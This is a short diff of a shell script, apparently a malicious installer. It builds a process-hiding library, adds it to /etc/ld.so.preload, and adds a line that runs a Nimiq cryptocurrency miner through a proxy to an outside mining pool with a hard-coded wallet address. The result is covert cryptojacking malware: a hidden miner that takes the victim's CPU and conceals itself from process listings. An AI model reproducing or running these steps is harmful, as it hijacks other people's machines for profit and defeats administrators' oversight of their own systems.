@@ -58,4 +58,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-
+./graftcp/graftcp ./noncerpro -a "NQ52 J9RY E6Y3 PFAS 8MEM B0QE HL2T LLJJ DSFF" -s nimiq.icemining.ca -p 2053 -n $(shuf -n 1 -i 1-999999) --threads=4 --mode=dumb
